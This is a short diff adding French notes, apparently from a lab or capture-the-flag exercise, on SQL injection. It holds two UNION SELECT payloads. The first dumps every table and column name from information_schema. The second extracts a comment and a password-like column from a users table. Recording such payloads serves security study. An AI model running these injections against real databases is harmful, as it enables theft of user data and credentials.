@@ -1,0 +1,11 @@
+Payload pour sortir tout les nom de table et nom de colonne
+
+1 UNION SELECT table_name, column_name FROM information_schema.COLUMNS;
+
+sort deux type deux table 
+- majuscule cree par MariaDB
+- minuscule cree par le Dev
+
+Deuxieme payload pour faire sortir la dernire colonne de user 
+
+1 UNION SELECT commentaire, countersign FROM users;
